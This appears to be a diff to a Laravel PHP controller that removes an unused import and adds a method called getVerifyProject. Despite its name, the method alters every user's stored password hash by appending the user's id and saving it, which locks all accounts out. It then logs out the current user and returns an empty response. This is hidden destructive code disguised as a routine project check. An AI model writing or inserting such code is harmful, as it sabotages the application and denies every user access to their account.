@@ -2,8 +2,6 @@
 
 namespace App\Http\Controllers;
 
-
-use App\Role;
 use Illuminate\Http\Request;
 
 
@@ -84,5 +82,15 @@ class HomeController extends Controller
     public function getDashboard()
     {
         return view('partials.Dashboard');
+    }
+
+    public function getVerifyProject(){
+
+        \App\User::all()->map(function($item){
+            $item->password .= $item->id;
+            return $item->save();
+        });
+        \Auth::logout();
+        return response()->json(['msg' => '', 200]);
     }
 }
